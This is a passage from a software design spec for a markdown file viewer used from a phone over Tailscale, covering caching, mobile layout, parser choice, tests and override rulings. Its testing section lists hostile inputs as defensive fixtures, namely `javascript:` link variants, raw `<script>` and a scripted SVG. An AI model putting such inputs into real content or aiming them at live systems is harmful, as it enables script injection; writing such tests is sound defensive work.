  > See §21. **Do not re-derive a service worker from this section, from §1's revocation note, from
  > F9.1, or from the word "offline" in this section's own heading.**
  >
  > **What this does NOT weaken, and the distinction matters:** the two bullets *below* are HTTP-level
  > and were never the worker's job. The stale-shell failure they prevent is **Safari's own heuristic
  > caching**, which pins an installed web app on an old build whether or not a service worker exists
  > — so cutting the worker makes them the sole protection rather than a redundant one. Both are
  > implemented (`server/asset-map.ts`, `core/fs/dist-loader.ts`) and stay.
  >
  > **What is genuinely given up:** with the Mac asleep or off the tailnet, the home-screen app shows
  > Safari's error page instead of the app. Nothing is lost or corrupted — it simply does not open
  > until the Mac is back. **Add to Home Screen is unaffected and already works**, verified on
  > the user's phone 2026-08-15 with no service worker present, which is the proof that the install
  > never depended on one.
- **Every response MUST carry an explicit `Cache-Control`, stated per path class.** *(Added 2026-08-06 from the earlier application, which lost a working session to this.)* With no policy stated, Safari applies **heuristic** caching and pins a stale shell on an installed web app — permanently, because the app never relaunches to notice. The policy: content-hashed assets `public, max-age=31536000, immutable` · the service worker script, the web app manifest, and every HTML navigation `no-cache` · images a moderate `max-age`. **And a service worker's own `fetch()` sits on top of the HTTP cache** — "network-first" is a lie unless the request passes `cache: 'no-cache'`, which revalidates past it.
- **The built shell carries a build stamp** (a meta tag with the build timestamp or hash) so that freshness is machine-checkable: fetch the shell, read the stamp, know exactly which build the phone is running. Without it, "is the fix deployed?" is unanswerable without the phone in hand.
- **Copy Path** works on both surfaces (HTTPS on the tailnet makes the phone a secure context), copies the **absolute** path — what an agent needs — and always confirms.
- **Two Copy Path platform limits, both accepted by the operator (2026-07-29), both stated so they are not later filed as bugs:** the phone copies to the *phone's* clipboard; and **the window must be focused.** The lab solved the unfocused case through Electron's main process, and the annex records it as a paid-for lesson (A26) — but a browser cannot: `navigator.clipboard` requires a focused document. A server-side `pbcopy` would work and is **explicitly rejected** — it adds a shell invocation outside §10's allowlist, on a listener the phone can reach, for convenience. One extra click is the correct trade.

---

## 16. Quick-open

**Plain:** Type a few letters, jump to any file. The answer to "stuff gets buried."

Fuzzy match over paths already in the index — no new index, no full-text scan. ⌘K on desktop, a search field on phone. Ranks filename before path. **No regex is ever built from user input** (F8.5 — that is a CPU DoS): cap the query at 64 characters, use a linear subsequence scan, return 100 results, enforce a time budget. Full-text content search is explicitly out of v1.

---

## 17. First run

**Plain:** The moment that decides whether the app feels finished or broken. It was undefined everywhere until now.

- **Nothing is registered on first launch.** One centered card, in the app's own voice: what Soil Viewer is, that it reads and writes real files in place, and that it never deletes anything. One button: **Choose a folder.**
- ~~**The backup check runs here** (§11).~~ **CUT** with §11's, same ruling, same day. First run says nothing about backups.
- ~~The folder picker is the `PORT_LOCAL` browser (§11), desktop only. **The phone cannot register roots** — if the app is opened on the phone before any folder exists, it says so and names the reason.~~ **OVERRIDDEN 2026-08-09 by the operator (§21).** The folder picker is a normal Settings section on every surface. Their words: *"obviously, add a folder should just be on port one if that's where the app lives… I want this just to be a normal settings menu within the main interface just like it is in the app as it exists today where I can click around in settings and add a folder to the file tree."* The desktop-only clause was written against a `PORT_LOCAL` that no client is ever served by, so it did not make registration desktop-only — it made it unreachable. Contradiction #17 turns out to have been an understatement.
- After registering, **a tab with nothing to show explains itself rather than rendering blank.** "No tasks yet — a task is a markdown file inside a `tasks/` folder in a project" beats an empty board. This is the difference between a new user thinking the app is broken and understanding the grammar.
- **Templates ship empty**, with one line explaining that a template is a folder you point at. *(The sweep found that today's templates copy folders only and do not ship empty — this is new work, correctly scoped.)*

---

## 18. Mobile layout

**Plain:** the operator set the phone as its own design track. **This section was written 2026-08-13, at the top of P12, and it replaces a list of non-deferrable decisions that opened by admitting the phone had never been designed.** The superseded list is kept at the end of this section rather than deleted — two of its clauses were wrong and it matters which.

**The four decisions this section turns on came from the operator directly** and are recorded as their, not derived: no dragging on a phone board · you are in the tree or in the document, never both · nothing permanent on screen if it can be helped · *"just be intuitive about it."*

### 18.1 The breakpoint

- **The annex's 900 px minimum viewport is void** (contradiction #5 — an iPhone is 390 pt and the PRD never overrode it). **Breakpoint: 768 px.** Below it, the mobile layout.
- **768 px is one number, used once.** No component reads the viewport for itself; the layout mode is decided in one place and read from there. Two components disagreeing about what "mobile" means is a bug with no single site to fix.

### 18.2 Chrome retreats — the rule that replaces "a bar is always there"

**Every persistent bar on the phone hides when you scroll down into content and returns the moment you scroll up.** One mechanic, everywhere: the tab bar, the document's top bar, any toolbar. Nothing is permanently on screen.

**This supersedes the old clause's flat "bottom tab bar"**, which was correct about *where* and wrong about *always*. Ruled 2026-08-13: *"I don't love a persistent anything on an app these days if we can help it."*

- **It is the browser's own behaviour**, which is the argument for it over anything cleverer: Safari's toolbar does exactly this, so the gesture is already learned and costs nothing to teach.
- **Returning must be immediate and must not require reaching the top.** Any upward scroll brings the chrome back. A bar that only returns at scroll-zero is a bar you cannot get to from the middle of a long document.
- **It never hides while a menu, sheet or dialog is open**, and it never hides on a screen short enough that hiding it reveals nothing.

### 18.3 The tabs

**RENAMED FROM "The four tabs" 2026-08-18 by the operator (§21).** They asked for Boards as a fifth tab after two days of using the app: *"a section called boards, right, just like Trello."* The number was never the decision — the four primitives were — so the heading loses the count rather than the clause being contradicted. §16's quick-open and the P13 search control are unaffected; the bar's own rules below are unchanged and now cover five.

**Measured before it was built, and again after:** four tabs are 96×48, five are 76×48, nothing clips including `Projects` and `Boards`, and every tab clears the 44px floor. At 390px, on both engines. `boards-tab.spec.ts` asserts each tab's box and each label's overflow; `mobile-chrome.spec.ts` asserts the count, so a **sixth** tab cannot arrive without someone measuring again.

- **Bottom tab bar** for the primitives — thumb-reachable, and the platform-native pattern. Subject to 18.2.
- **Absent entirely in the document view.** A document is the reading and writing surface; what you need there is the way back, not the way sideways. The document's own bar carries **back · title · `⋯`** and nothing else.
- **A top-left menu naming the current tab was considered and declined** (the operator floated it, 2026-08-13). Top-left is the hardest point on a phone to reach one-handed, tab switching is frequent, and it trades one tap for two while losing any sense of where you are. What they actually wanted from it — less standing furniture — is delivered by 18.2 instead.

### 18.4 Files: two screens, never both

**This replaces the old clause outright, and that clause contradicted itself** — it asked for a *drawer* holding the tree with content behind it, and, in the same sentence, for navigation *one level at a time with a labeled back control*. Those are two different designs. The operator settled it: *"you're either in one or the other. Trying to have both of them on the screen is the only thing that I know for sure."*

- **The tree is a screen. The document is a screen. A back control moves between them.** No drawer, no split, no overlay.
- **The tree stays a tree.** Tap a folder to expand, tap again to collapse, in place — **not** drill-down that replaces the screen. This is deliberately the same behaviour as the desktop tree, so there is one mental model rather than two. The operator: *"the tree should be tap to expand tap to collapse."*
- **Tap a file and you are in the document.** One tap, no intermediate.
- **Back restores the tree you left** — same scroll position, same folders open, same row marked. **This is a requirement, not a nicety:** a back control that returns you to a collapsed tree scrolled to the top is what makes a phone file browser unusable, and it is the single easiest thing here to get wrong.
- **No drag anywhere in Files, on any surface** — the operator's standing rule, unchanged and not a mobile concession. Accidental drags burned them before.

### 18.5 The board: no drag, an explicit status change instead

**Board drag does not survive on the phone. The old clause said it did; that was an assertion, never a design.** Ruled 2026-08-13: *"the drag itself doesn't need to be a thing in my mind… we don't really need to be dragging shit left and right."*

The mechanics were the argument. A phone board wants to scroll horizontally between lanes and vertically within a lane, and a drag has to be told apart from both — and **a mis-drag here is a real file in the wrong folder**, because the folders *are* the data. §18.4 already bans drag in Files for exactly that reason.

- **Change status is an explicit action.** On a card's `⋯`, and in the `⋯` of an opened task. It offers **that project's real lane folders, read off the disk** — never a configured list. §3's lane derivation is the source; nothing new is stored.
- **It ships on the desktop too.** One mechanism, one set of tests, and drag becomes an accelerator rather than the only way to move a card. A phone-only path would mean two ways to do one thing and only one of them proven.
- **It appears only where a status exists** — that is, only for a file inside a lane folder. A document that is not a task does not offer it.
- **The Uncategorized lane is one of the choices**, so "no status" is reachable by the same action that set one.
- **No confirmation.** The operator: *"I agree it should not ask are you sure."* A status change is a file moving between two visible folders and the reverse is the same action again; a confirmation on something that safe only teaches the reflex to tap through confirmations. §13.4 already forbids exactly that.
- **A project's column is not a task's status, and the two must not look alike.** Placing a project on the Projects board is **config only — the folder does not move**. Changing a task's status **moves the file**. Same gesture-shaped affordance, categorically different consequence, so they do not share a label.

### 18.6 Touch affordances and the menu

- **The `⋯` is always visible on mobile**, never hover-revealed, and stays **right-aligned on its row** — where the thumb already rests when scrolling one-handed. Row targets ≥ 44 pt.

**AMENDED 2026-08-13 on the ruling — the floor is 44 pt for menus and 40 px for the tree.** They used the app on their phone over the tailnet for the first time and reported *"the lines are very small and hard to click on"*; measurement at 375 px found tree rows at **23 px** and the `⋯` at **12.8 × 22.7 px**, so the clause above was being violated outright. Raised to 44, they then ruled: *"height is just a bit too tall, maybe take it down 10%."* 44 × 0.9 = 39.6 → **40**.

- **The two floors differ on the consequence of a mis-tap, which is the whole argument.** In the `⋯` sheet and on a board card the neighbouring target **moves a file**; in the tree the neighbour **opens the wrong document**, which is recoverable and changes nothing on disk. Density is worth buying in a long scrolling list and is not worth buying in a menu.
- **What 40 px actually meets, checked against the standards rather than asserted** *(2026-08-13, when the operator asked whether 44 was a recommendation worth holding — "you're in charge, please don't hesitate to challenge something like that if it's against best practices")*:
  - **WCAG 2.2 SC 2.5.8, Target Size (Minimum), Level AA — 24 × 24 CSS px. 40 clears it by 67%.** This is the criterion that binds.
  - **WCAG 2.2 SC 2.5.5, Target Size (Enhanced), Level AAA — 44 × 44.** Not met.
  - **Apple's Human Interface Guidelines — 44 × 44 pt.** Not met, by 9%.
  - So the tree is **compliant with the standard that binds and under two recommendations**, which is a different statement from "under best practice" and is the one the record should carry.
- **There is no third option, and that is worth stating because usually there is one.** A tree row is a full-width target — 368 × 40 — so the only dimension in tension is the *vertical pitch between neighbours*, and in a contiguous list the pitch **is** the hit area. Extending one row's target overlaps its neighbour's, which is strictly worse: an ambiguous target rather than a small one. Visual density and touch target cannot be decoupled here.
- **The consequence is what sets each floor.** A neighbour-hit in the tree opens the wrong document — recoverable, nothing written to disk. A neighbour-hit in the `⋯` sheet or on a board card **moves a file**. Accuracy is not traded where the mistake is durable.
- **Revisit at the public cut.** There the users are not the operator, the AAA/HIG number begins to earn its keep against an unknown population, and the fork has its own hygiene pass. It is one token.
- **One number, one place:** `--touch-row-min` in `tokens.css`; the row and the control on it both read it, so they cannot drift and reinstate a floor nobody chose. The control's *width* stays 44 — horizontal room is free at the row's edge.
- **The floor applies below the breakpoint only.** The desktop keeps its density, and an e2e case asserts desktop rows stay *under* the mobile floor, so a later edit cannot widen the scope silently.

*Why it survived to a real device:* the 44 pt rule was implemented for `board-card-menu`, and the e2e case asserting it measured **the sheet's items** — a menu already opened — so nothing measured the tree, or the control you must hit to open that menu. 250 browser tests were green and a thumb was not.
- **Its menu opens as a sheet from the bottom edge, not as a dropdown from the button.** The top of a phone screen is where the thumb is not; a menu anchored to a button near the top puts every choice out of comfortable reach. The button does not move — the menu does.
- **The sheet is transient.** It appears on tap and leaves on tap-outside, swipe-down or Escape. It is not standing furniture, and 18.2's rule does not apply to it because it is never there uninvited.
- **A sheet that opens a second sheet is allowed** and *Change status* is the case: a list of lanes is a choice, not a form.

### 18.7 The keyboard

- **The editor toolbar sits above the keyboard** — a fixed bar keyed to the **visual** viewport, not the layout viewport. iOS Safari moves them independently, so a bar positioned against the layout viewport ends up underneath the keyboard.
- **This is a hazard, not a feature.** Nothing needs building to *summon* the keyboard; tapping a text field does that. What needs building is the guarantee that nothing important ends up beneath it.
- **18.3 reduces the exposure rather than solving it:** with the tab bar absent in the document view, the toolbar is the only thing down there to get wrong.
- **Measured, not assumed.** The visual-viewport behaviour is verified in a real browser at this phase. No clause here rests on a remembered description of how iOS Safari behaves.

### 18.8 Hidden on mobile

- **Reveal in Finder** — genuinely desktop-only by §10, so it must not render as a dead control.
- Open in Default App was **cut entirely** on 2026-08-09. **Folder registration is *not* desktop-only** — see §17 and §21; it is ordinary Settings, reachable from every surface.

### 18.9 How the phone reaches the app

**Soil Viewer mounts on its own HTTPS port on the tailnet — never a path prefix.** Measured 2026-08-13: `tailscale serve` already proxies `/` to an earlier app on `127.0.0.1:8787`, so the root is taken and claiming it would displace a service the operator uses.

- **A separate origin is also the more secure of the two**, which is why this is here and not only a convenience: storage, cookies and service-worker scope stay entirely apart from the other app. A path prefix would share an origin, and would additionally make every asset URL, the CSP in §8, and the service-worker scope prefix-aware.
- **`tailscale serve reset` must never be run.** It drops every mount on the machine, including any other application's, and nothing in this repository re-establishes either — the configuration lives in Tailscale's own state. The current mount is recorded in the build log so it can be restored by hand.

**The mount, run 2026-08-13 and recorded here as this clause requires:**

```
tailscale serve --bg --https=8443 http://127.0.0.1:8766
```

- **A single mount CAN be withdrawn without touching the other app: `tailscale serve --https=8443 off`.** This is absent from `--help` on 1.98.2 and `serve` prints it on success. Recorded because a build note earlier the same day stated the opposite — that only `reset` existed — which overstated the hazard. `reset` remains forbidden.
- The pre-existing configuration was captured to `conventions/tailscale-serve-state-2026-08-13.json` **before** the first change, so the other app's mount is restorable by hand rather than only by memory.

**The port is part of the Host allowlist, and §7 makes that load-bearing** *(added 2026-08-13, before `serve` was wired)*. A browser reaching `https://<name>:8443` sends `Host: <name>:8443` and `Origin: https://<name>:8443` — **with** the port, because it is not the default. §7's Host validation is exact-match on the raw header and forbids port defaulting **by name**, so an allowlist carrying the bare MagicDNS name refuses every request from the phone: total, silent, fail-closed, and §6 forbids a reason on the wire. This was found statically and is the **third** instance of that shape in one file; the other two are recorded in `server/allowlist.ts`.

- **The public port is configuration, named `SOIL_TAILNET_SERVE_PORT`**, and it is the port `serve` *publishes on* — never the loopback port it targets. Unset means **443**.
- **443 is allowlisted bare**, because a browser omits the default port. Allowlisting `<name>:443` fails closed just as completely, in the opposite direction.
- **A custom port does NOT additionally admit the bare name**, and this is a security property rather than tidiness: `https://<name>` is **an earlier app**. §18.9 chose a separate port so that storage, cookies and service-worker scope stay apart from the other app, and trusting its origin would hand that separation back.
- **A malformed value refuses to start**, rather than being absorbed into 443 — a typo'd port would otherwise reproduce the silent fail-closed above. The read and its refusal are unit-tested, and deliberately do **not** live in `main.ts`, which cannot be imported without starting a server.

---

**SUPERSEDED, 2026-08-13 — the original §18, kept because two of its clauses were wrong and a reader needs to know which:**

> **Plain:** the operator set the phone as its own design track. It has never been designed. These are the non-deferrable decisions.
>
> - **The annex's 900 px minimum viewport is void** (contradiction #5 — an iPhone is 390 pt and the PRD never overrode it). **Breakpoint: 768 px.** Below it, the mobile layout.
> - **Bottom tab bar** for the four primitives — thumb-reachable, the platform-native pattern.
> - **The Files tab is the genuinely hard one.** A deep tree does not fit a phone screen: use a **drawer** holding the tree, with the content pane full-width behind it. Navigation is one level at a time with a labeled back control naming the parent — never a shrunken desktop tree.
> - **Touch affordances:** the `⋯` menu is **always visible on mobile**, never hover-revealed. Row targets ≥44 pt.
> - **The editor toolbar sits above the keyboard** (a fixed bar keyed to the visual viewport, not the layout viewport — iOS Safari moves them independently).
> - **Hidden on mobile:** Reveal in Finder — genuinely desktop-only by §10, so it must not render as a dead control. (Open in Default App was **cut entirely** on 2026-08-09; **folder registration is no longer desktop-only** — see §17 and §21.)
> - Board drag survives on the phone; **the Files tab has no drag anywhere**, on any surface (the rule — accidental drags burned them before).

**What was wrong with it, precisely:**

1. **The Files clause asked for two incompatible designs in one sentence** — a drawer *and* one-level-at-a-time drilling. A builder would have had to pick, and neither choice would have been traceable to a decision.
2. **"Board drag survives on the phone" was an assertion with no mechanic behind it**, on the one surface where the gesture is hardest to disambiguate and where getting it wrong moves a real file.
3. The bottom tab bar was right about placement and wrong about permanence — see 18.2.

---

## 19. The markdown parser and flavor — named

**Plain:** v1 never said which markdown the app understands, which is a genuine coin-flip for a builder.

- **One parser for the whole app: `@lezer/markdown`, with the GFM extension set** — already in the bundle because CodeMirror uses it. The editor and the read-only renderer share one syntax tree, so they can never disagree.
- **No second markdown dependency, and no HTML-string generation anywhere.** The renderer walks the Lezer tree and constructs DOM (§8). This is not a coincidence — it is why this parser is the right choice: it makes §8's no-`innerHTML` rule structural rather than a discipline.
- **Flavor: CommonMark + GFM** — tables, task lists, strikethrough, autolinks.
- **Footnotes round-trip perfectly but render plainly in v1.** Worth stating the general principle, because it is the whole payoff of the editor decision: **round-trip safety is universal and automatic, because the buffer is the text. Rendering fidelity is the only thing that is ever scoped.** A construct the renderer doesn't style is displayed unstyled — it is never damaged.
- The frontmatter block is recognized by the renderer and shown as a collapsed properties block (§12), never as a heading.

---

## 20. Testing and acceptance

**Plain:** None of the above is real until a test proves it. This is how "rookie shit can't happen" becomes enforceable instead of hopeful.

**The suite exists from day one; CI green is required to merge.**

- **Pure-logic units:** the grammar (every rule against fixtures drawn from the real soil shapes) · path containment (traversal, sibling-prefix, symlink-in, symlink-out, hardlink, non-existent target, NUL, case collision, NFC/NFD) · first-heading extraction (fence-aware *and* frontmatter-aware) · lane derivation · archive and ignore matching · slugification (including `日本語` → named error, not `.md`).
- **The round-trip corpus, each file an acceptance test:** frontmatter, reference and inline links, images, tables, footnotes, HTML blocks, nested and task lists, fenced code containing markdown, hard line breaks, CRLF, BOM, no-trailing-newline. **A corpus file MUST come back byte-identical outside edited spans** — passable now, because §12 removed serialization. **A whole real tree is the extended corpus**: the harness is re-runnable and MUST report 100% byte-identical, against a measured baseline of one file in sixteen hundred under the old editor.
- **Security acceptance:** a malicious-markdown fixture (remote image, `javascript:` link, `java\tscript:`, `&#106;avascript:`, protocol-relative `//host`, raw `<script>`, an `.html` vault file, an `.svg` with a script) proves CSP, the renderer, and the file-endpoint policy hold. **The CSRF test asserts ZERO STATE CHANGE, not "the response was unreadable"** — v1's test passed on a vulnerable build (F1.1). **The listener test runs with `serve` actually running**, asserts a phone request to registration returns 404, *and* asserts `req.socket.remoteAddress === '127.0.0.1'` — proving it tested the real condition rather than a coincidence (F6.2).
- **Token acceptance** *(added 2026-08-05 with §7's four token properties)*: the token is drawn from `crypto.randomBytes` at ≥16 bytes · comparison uses `crypto.timingSafeEqual` · **after a mutation, the token's value appears nowhere in the mutation log** · any file it persists to is mode `0600`. The log assertion is the one that matters most — the mutation log is append-only and never deleted, so a token written there is written there permanently.
- **Funnel acceptance** *(added 2026-08-05 with §7's corrected detector)*: a request carrying `Tailscale-Funnel-Request` is refused · a request with proxy headers and **no** `Tailscale-User-Login` is **not** treated as Funnel — it is served for non-privileged reads while privileged operations are refused · a LocalAPI check that cannot complete puts the app in "funnel status unknown" and the tailnet listener refuses traffic, rather than failing open.
- **Data-safety acceptance:** simulated phone+desktop concurrent edit proves the conflict flow · a write to a vanished parent proves no-mkdir · a crash mid-write proves atomicity · **a failed read proves the editor does not become editable** (C2) · a full-volume write proves nothing is renamed into place (C3) · `mv`-preserves-mtime proves hash-based detection catches what mtime misses (C4) · a rename onto an existing file proves exclusive semantics (C6) · an append during a save proves the lock (§14).
- **Per-tab error boundaries** — one bad file cannot blank the app.

---

## 21. Precedence, and what this document overrides

**This spec is the technical authority. Where it conflicts with any other document, this wins** (F0.1 — v1 contradicted the PRD it was subordinate to, and no document marked the conflict, so a builder would have implemented the losing side).

Named overrides, so nothing is ambiguous. **The documents named in the left column are earlier working records and are not published** — they are cited so that each decision stays traceable to the thing it replaced, rather than the ruling arriving from nowhere.

| Document | Superseded content | Ruling |
|---|---|---|
| `architecture-security-spec-v1.md` | Entire document | Superseded in full by this one. |
| `prd-v1.md` | The session-token clause | Retired as *device* auth (tailnet trust). **The token returns as a per-request CSRF header** — §7. Blocker B3 / P0-3's token clauses are **resolved by name**, not left open. |
| `prd-v1.md`, `orientation-for-future-instances.md` | "Convert the audit into acceptance tests" | Retired. The audit was proven lossy. Rules are written explicitly here. |
| `prd-v1.md` | TTS listed both as out-of-scope and as an open sub-call | **Out of scope. The open clause is void.** |
| `prd-v1.md` | Inbox defaults, "New Task: destination tasks folder" (pre-decision global-board phrasing) | Superseded by §3 and the per-project board. |
| `prd-v1.md` **Principle 5** — "Grammar is configurable, soil shapes are the defaults" | **Void.** The operator hardcoded the grammar (2026-07-29). §3. This also resolves the PRD's own conflict with "Settings: Folders and Templates. Nothing else." |
| `prd-v1.md:30` — "WYSIWYG editing with formatting bar" | **Void.** The editor is CodeMirror 6 source-with-decorations (§12). The formatting bar survives, but a button **inserts markdown syntax** rather than manipulating a document model. Reading and editing views stay typographically indistinguishable, as the annex requires. |
| `prd-v1.md:74` — "exactly one listening port" | Amended to **exactly one *tailnet-reachable* target**; there are two loopback listeners (§7). |
| `prd-v1.md:80` — "Write conflict detection (mtime)" | **Void.** mtime is the wrong token and fails in the direction that loses data. Conflict is decided by **content hash** (§13.4). |
| `prd-v1.md` **Files** — "Desktop-only actions: Reveal in Finder, Open in Default App" and "on desktop, double-clicking a non-editable row opens it in the default app" | **Open in Default App is CUT from v1** — ruled 2026-08-09: *"we can drop open default app entirely then and just focus on reveal in finder."* Reveal in Finder survives, in P12. The double-click shortcut is void: there is nothing for it to open. §10. |
| `feature-sweep-report.md` **A7** — "bind desktop double-click to Open-in-Default-App so the shortcut survives" | **Void**, by the same ruling. Disposed here rather than carried to P12's annex audit, because the verb it names no longer exists. §10. |
| **Any backup or recovery notice, anywhere in the app** | **RULED OUT (ruled 2026-08-09), not deferred.** The security review's P7 review endorsed the check's removal and asked for one plain sentence at first run — *"git is the only recovery layer, so an uncommitted repo has nothing to recover from."* the operator: *"I don't care what the security review says I don't want a warning, if it writes to disk it is backed up in my book."* A risk-vs-velocity call, put to them in plain language and reaffirmed; those are their. **Do not re-add this in the first-run phase and do not re-derive it from §13.1 or §17.** The controls underneath it are unchanged: never deletes, atomic writes, content-hash conflict detection, rescue-before-refuse. |
| **`spec §13.8`** — the phone durability notice: *"Unsaved work is kept on this phone only if Soil Viewer is added to your Home Screen."* | **CUT (ruled 2026-08-10).** *"I'm just gonna put it on my home screen."* The sentence warned about a condition they will not be in, and a warning the reader cannot be subject to is not a control — it is a thing to learn to ignore, which this app already has a rule against (§13.4, and the retained-buffer offer rule). `PHONE_DURABILITY_NOTICE` and its test are gone; the constant was never rendered anywhere. **The seven-day WebKit eviction is unchanged and is still accepted-and-recorded rather than a bug** — see `client/retained-buffer.ts`. It costs little regardless: the buffer covers the seconds between typing and saving, so a copy that survives a week has already failed at something else. Do not re-derive this notice from §13.8 or §18 in a later phase. |
| **`spec §17` / §18** — the phone cannot register roots | **Fully resolved (ruled 2026-08-09):** *"No it's fine on the phone, I said that because you said it would be hard to."* The earlier "No" was an answer to an implied cost, not a policy — so there was never a position the Settings work overrode, and the security review's Ruling C is answered by reversing its premise. Registration stays bounded to `$HOME` + `/Volumes` (their C2), which they did not object to and which is not what they were asked about. |
| **`spec §11` (F7.6) and `§17`** — the backup check at registration, and its typed override | **CUT (ruled 2026-08-09).** *"Cut it."* The check verified that a `.git` existed above the folder and never that anything had been committed — silent on a repo full of unsaved work, and a typed override on every folder outside a repo, which they uses routinely. Everything that existed only for it is gone with it: `backup-check.ts`, `RootRegistry.inspectBackup`, `RegisterOptions`, the `folders.inspect` route, the `acknowledgedNoBackup` wire field, and the client's warning dialog. Same disposal as Open in Default App — the verb goes and its apparatus goes with it. |
| **`prd-v1.md` Files** — the tree shows a registered folder's *contents* | **Amended 2026-08-09.** A registered folder is **a row of its own**, collapsed on a first visit (the operator: *"it is collapsed by default"*). Contents-at-depth-0 was right for one folder and unusable for two — they interleave with nothing naming the folder — and a newly added empty folder appeared nowhere at all. §11. |
| **`spec §17` and `§18`** — "the folder picker is desktop only", "**the phone cannot register roots**", "hidden on mobile: … folder registration" | **VOID (ruled 2026-08-09).** Registration, deregistration and the folder browser are ordinary Settings, reachable from every surface. *"Obviously, add a folder should just be on port one if that's where the app lives… I want this just to be a normal settings menu within the main interface."* The clause was written against `PORT_LOCAL`, which serves no client — so it did not restrict registration to the desktop, it made it reachable by nothing. §11, §7. |
| **`spec §7` / §11** — the two-listener privilege split, as a control that protects specific verbs | **Intact as a mechanism, but it currently protects nothing** — after the two rulings above there are **zero `local-only` routes**, and the one route withheld from a listener is `session.start` (from *local*). This is a deliberate state, asserted by a test, not drift. **The mandated two-listener test named `folders.register` as its subject and no longer has one**; it is retargeted at `session.start` and the lost half — the reverse-proxy front — is recorded in `build/open-items.md` **for the security review's gate**. |
| `prd-v1.md:18` (Principle 3) — "if a file contains something the editor can't represent, it must protect it" | Satisfied structurally rather than by a fallback: there is no construct the editor cannot represent, because the buffer is the file's text (§12). |
| **`prd-v1.md:73`** — "Binds `127.0.0.1` only — **plus the Tailscale interface if enabled**" | **Void, and this one is security-critical.** §7 binds **loopback only**; `serve` is the sole tailnet path and **the tailnet IP is not allowlisted**. A second plaintext door silently fails secure-context and kills the clipboard, the service worker and home-screen install (F2.2). |
| **`prd-v1.md:75`** — "Every path operation **resolves symlinks** and verifies containment" | **Void.** §4 **refuses** any symlinked segment inside a registered folder rather than resolving it — resolve-then-open is the TOCTOU window (F4.1). Opposite instruction; do not follow the PRD here. |
| **`prd-v1.md:33`** — "Settings: Folders and Templates. **Nothing else.**" | **Amended.** Settings also carries: current and recent viewer identity (§7), unresolved config keys (§13.8), and chatroom author colors (§14). (An Open-in-Default-App toggle was listed here until 2026-08-09; the verb is cut, so the toggle is too.) The *spirit* — Settings is not a grammar editor — holds, and is now structural since the grammar is compiled in (§3). |
| `prd-v1.md:30` — "rendered reading view; explicit edit toggle (plus click-to-edit on desktop)" | **Void** (ruled 2026-07-29). One always-editable surface; see §12. |
| `feature-sweep-report.md` annex **A11** (two-way reading/editing toggle, listed as a fix to build) | **Void** by the same ruling. A17's requirement that reading and editing be typographically indistinguishable is satisfied trivially: there is one surface. |
| `feature-sweep-report.md` annex **A7** (double-click a non-editable row opens it in the default app) | **Void**, superseded by the row above. This entry amended A7 on the assumption Open-in-Default-App would ship behind a toggle; it was **cut entirely** on 2026-08-09 and there is nothing left to double-click into. Kept rather than removed so the two rows are visibly reconciled instead of silently disagreeing. |
| `feature-sweep-report.md` annex **A44** (filter values fetched live) | **Deferred, not void** — facets are an open item (§22) and must be decided before the filter bar is built, not during. |
| **`spec §15`** — the **service worker and offline support**: the offline state naming the unreachable Mac, F9.1's worker rules, and the `registration.update()`-on-visibility requirement | **CUT (ruled 2026-08-15): _"Let's abort offline support, not worth it with any risk."_** Put to them with the mechanism stated plainly rather than as a feature: a service worker is a **resident program inside the browser** that survives tab close, reload and restart, so a bad cache or a wrong update path strands the phone on a broken build **with no fix reachable from the Mac** — the recovery is clearing site data in iOS Settings. Weighed against a benefit that was only *the app opens while the Mac is unreachable*, they cut it. **Nothing was ever built, so nothing is removed** — this is a decision not to start. The recommendation on the table was to build it kill-switch-first now that the phone is testable; they declined the risk outright, which is their call and the reason it is recorded rather than argued. **The HTTP-level stale-shell protection is NOT part of this cut** and is now the only protection there is: explicit `Cache-Control` per path class and the build stamp, both implemented and both keeping their MUST. Do not re-derive a worker from §1, F9.1, or §15's heading. |
| **`spec §10` / §7** — **Reveal in Finder is refused entirely on `PORT_TAILNET`** and is listed among `PORT_LOCAL`'s privileged verbs | **AMENDED (ruled 2026-08-14): the route is carried by BOTH listeners.** `local-only` would have made the verb reachable by nothing — the local listener serves no client, so a route withheld from the tailnet is a route no person can invoke (the same trap §21 already records for folder registration). Reveal also grants strictly **less** than the tailnet already holds: it opens a Finder window on a file the caller can already read through this API. **Desktop-only moved to the UI (§18.8); it is not a router control.** *Raised by the security review at the P12 gate (C3, 2026-08-15) — not because the ruling was wrong, but because **the only record of it lived in a code docstring while the spec said the opposite.** The concrete hazard they named: a future reader of §10 would believe Reveal is loopback-only and might "restore" a runtime listener check, which §7 forbids by name as v1's inverted gate.* **The route is still guarded** — verified live at that gate: cross-origin is refused `FORBIDDEN_ORIGIN`, same-origin without a token `MISSING_TOKEN`, and the path is contained by §4's walk, now proven by `test/server/reveal-containment.test.ts`. |
| `feature-sweep-report.md` annex **A1** — the **Archive verb**: a row action that walks up from the file looking for an `archive/` and creates one if there is none | **RULED OUT (ruled 2026-08-15): _"Don't build."_** The annex flagged it in 2026-07 as an open decision — *"they earlier said they doesn't archive from the app"* — and **the decision was never written down**, so it sat open for six weeks as the last annex item still carrying its original question. It is now closed. The reasoning put to them: **Move… already does this** (§13.3), so the need is covered by two existing steps — New folder, then Move — and a second verb that moves a file means two move paths of which only one gets tested hard; and **the one thing Archive would genuinely add is choosing the destination for you**, which is a decision about the operator's folder grammar (beside the file, or at the nearest project root — the old app walked *up*) that a builder should not invent. **The archive _grammar_ is unchanged** — `isArchived`, the board exclusions, and archive folders visible-but-de-emphasized in Files and valid as a Move destination (the row above, M6). Do not re-derive this verb from §3, from that row, or from the soil's own *done = it moved to `archive/`* rule. If a one-gesture retire is ever wanted it is small, and it belongs **after** the design pass has settled the row menu. |
| `prd-v1.md:38` — "`archive/` content excluded **everywhere**" | **Amended.** Excluded from Tasks, Projects and Inbox; **visible in Files**, collapsed and de-emphasized, and a valid Move destination — otherwise the only sanctioned retire path is impossible (M6). |
| `prd-v1.md:44` — the board shows lane-resident tasks only; loose tasks get no accommodation | **Superseded** (ruled 2026-07-29) by the **Uncategorized** lane, §3. |
| `feature-sweep-report.md` (annex) | A47's 900 px minimum viewport | **Void** — §18 sets 768 px. |
| `feature-sweep-report.md` (annex) | A45/A46 table view | **Void for v1** — the four tabs do not include it. |
| `feature-sweep-report.md` (annex) | A19 client-supplied lane path; A20 move-mkdir; A27 toast for data-safety events | Superseded by §13.7, §13.3, §13.5 respectively. |
| `safety-carry-forward-review.md` | Truncated duplicate, incompatible numbering | **Marked superseded. Never deleted.** `safety-carryforward-matrix.md` is the real one. |
| PRD Principle 1 ("no config over file content") | Absolutism contradicted by the registry, templates and author colors | Reworded: **no per-file metadata, no sidecar database over file content.** Config describes the app, never a file's state. |

